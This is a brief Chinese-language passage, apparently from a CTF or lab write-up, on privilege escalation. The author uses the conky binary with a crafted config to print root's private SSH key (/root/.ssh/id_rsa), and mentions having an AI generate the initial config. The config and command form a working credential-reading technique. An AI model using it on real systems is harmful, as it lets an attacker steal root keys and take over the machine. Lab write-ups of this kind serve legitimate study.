提权

在一开始找提权方案的时候看见了/usr/bin/conky这个内容，让ai给生成了应该读取文件的config内容

然后再修改这个内容，符合我们想要得到的文件内容，这里我尝试获取root下的id_rsa文件

superruut@t800:/home/superruut$ cat conky.conf
conky.config = {
       out_to_console = true,
       out_to_x = false,
}

conky.text = [[
${head /root/.ssh/id_rsa 30}
]]

然后运行即可得到id_rsa文件
